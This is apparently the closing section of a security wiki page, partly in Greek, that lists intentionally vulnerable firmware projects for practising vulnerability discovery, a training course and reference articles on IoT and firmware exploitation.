Για να εξασκηθείς στην ανακάλυψη vulnerabilities σε firmware, χρησιμοποίησε τα παρακάτω vulnerable firmware projects ως σημείο εκκίνησης.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Trainning and Cert

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [Synacktiv - Exploiting the Tesla Wall Connector from its charge port connector - Part 2: bypassing the anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
